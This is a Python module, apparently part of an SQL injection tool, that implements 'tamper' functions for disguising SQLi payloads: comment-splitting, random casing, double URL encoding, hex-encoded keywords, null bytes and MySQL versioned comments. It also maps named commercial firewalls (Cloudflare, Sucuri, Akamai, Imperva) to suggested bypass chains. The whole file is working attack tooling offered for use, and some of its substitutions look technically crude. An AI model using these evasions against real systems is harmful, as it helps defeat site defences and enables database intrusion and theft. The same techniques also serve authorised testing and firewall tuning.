# -*- coding: utf-8 -*-
"""
WAF Evasion Engine (Tamper Scripts).

This module contains a collection of functions to modify SQLi payloads
in order to bypass web application firewalls.
"""
import random
import re
from urllib.parse import quote_plus

def space_to_comment(payload: str) -> str:
    """Replaces spaces with block comments `/**/`."""
    return payload.replace(" ", "/**/")

def random_case(payload: str) -> str:
    """Randomizes the case of each character in the payload (e.g., 'SELECT' -> 'sElEcT')."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

def plus_url_encode(payload: str) -> str:
    """URL-encodes the payload, replacing spaces with '+'."""
    return quote_plus(payload)

from urllib.parse import quote

def char_double_encode(payload: str) -> str:
    """Double-URL-encodes all characters."""
    return "".join(f"%{ord(c):02x}" for c in quote(payload, safe=""))

def equal_to_like(payload: str) -> str:
    """Replaces all instances of '=' with ' LIKE '."""
    return payload.replace("=", " LIKE ")

def space_to_random_blank(payload: str) -> str:
    """Replaces space characters with random whitespace characters."""
    whitespace = ['%09', '%0a', '%0b', '%0c', '%0d']
    ret_val = ""
    for char in payload:
        if char == ' ':
            ret_val += random.choice(whitespace)
        else:
            ret_val += char
    return ret_val

def versioned_keywords(payload: str) -> str:
    """Wraps keywords in MySQL versioned comments."""
    # A simple implementation focusing on common keywords
    payload = re.sub(r'(?i)\b(UNION|SELECT)\b', r'/*!50000\1*/', payload)
    return payload

def keyword_substitution(payload: str) -> str:
    """Replaces logical operators with their equivalents (e.g., AND -> &&)."""
    # Note: This is highly database-dependent.
    return payload.replace(" AND ", "&&").replace(" OR ", "||")

def hex_encode_keywords(payload: str) -> str:
    """Hex-encodes common SQL keywords (MySQL-specific)."""
    payload = re.sub(r'(?i)\b(SELECT)\b', '0x53454c454354', payload)
    payload = re.sub(r'(?i)\b(UNION)\b', '0x554e494f4e', payload)
    return payload

def add_null_byte(payload: str) -> str:
    """Appends a URL-encoded null byte character."""
    return payload + "%00"

def split_keywords_by_comment(payload: str) -> str:
    """Splits SQL keywords with block comments (e.g., 'union' -> 'un/**/ion')."""
    payload = re.sub(r'(?i)\b(union)\b', 'un/**/ion', payload)
    payload = re.sub(r'(?i)\b(select)\b', 'sel/**/ect', payload)
    return payload

def function_synonyms(payload: str) -> str:
    """Replaces common functions with their synonyms."""
    payload = re.sub(r'(?i)\b(substring)\b', 'MID', payload)
    payload = re.sub(r'(?i)\b(benchmark)\b', 'SLEEP', payload)
    return payload

def comment_around_keywords(payload: str) -> str:
    """Adds comments around keywords (e.g., 'SELECT' -> '/*SELECT*/')."""
    payload = re.sub(r'(?i)\b(SELECT|UNION|AND|OR|FROM)\b', r'/*\1*/', payload)
    return payload

# A dictionary to map tamper script names to their respective functions.
# This makes the tamper engine easily extensible.
TAMPER_FUNCTIONS = {
    'space2comment': space_to_comment,
    'randomcase': random_case,
    'urlencode': plus_url_encode,
    'chardoubleencode': char_double_encode,
    'equaltolike': equal_to_like,
    'space2randomblank': space_to_random_blank,
    'versionedkeywords': versioned_keywords,
    'keywordsubstitution': keyword_substitution,
    'hexencodekeywords': hex_encode_keywords,
    'addnullbyte': add_null_byte,
    'splitkeywords': split_keywords_by_comment,
    'functionsynonyms': function_synonyms,
    'commentaroundkeywords': comment_around_keywords,
}

def apply_tampers(payload: str, tamper_list: list[str]) -> str:
    """
    Applies a list of tamper scripts to a payload sequentially.

    :param payload: The original SQLi payload string.
    :param tamper_list: A list of tamper script names to apply (e.g., ['space2comment', 'randomcase']).
    :return: The modified, tampered payload.
    """
    tampered_payload = payload
    for tamper_name in tamper_list:
        tamper_func = TAMPER_FUNCTIONS.get(tamper_name)
        if tamper_func:
            tampered_payload = tamper_func(tampered_payload)
        else:
            print(f"[!] Warning: Tamper script '{tamper_name}' not found and will be skipped.")
    return tampered_payload

# A mapping of known WAFs to a suggested list of tamper scripts for bypassing them.
# This provides the "adaptive" logic for the tamper engine.
WAF_TAMPER_MAP = {
    "Cloudflare": ["space2randomblank", "versionedkeywords", "randomcase", "hexencodekeywords", "addnullbyte", "splitkeywords", "commentaroundkeywords"],
    "Sucuri": ["urlencode", "space2comment"],
    "Akamai": ["randomcase", "space2comment"],
    "Imperva": ["urlencode"],
    "Generic": ["space2comment"]  # Default for unknown or undetected WAFs
}

def get_tampers_for_waf(waf_name: str | None) -> list[str]:
    """
    Returns a list of recommended tamper scripts for a given WAF.

    :param waf_name: The name of the detected WAF.
    :return: A list of tamper script names.
    """
    if waf_name and waf_name in WAF_TAMPER_MAP:
        print(f"[*] WAF detected: {waf_name}. Applying specific tampers: {WAF_TAMPER_MAP[waf_name]}")
        return WAF_TAMPER_MAP[waf_name]

    print(f"[*] No specific WAF detected. Applying generic tampers: {WAF_TAMPER_MAP['Generic']}")
    return WAF_TAMPER_MAP["Generic"]
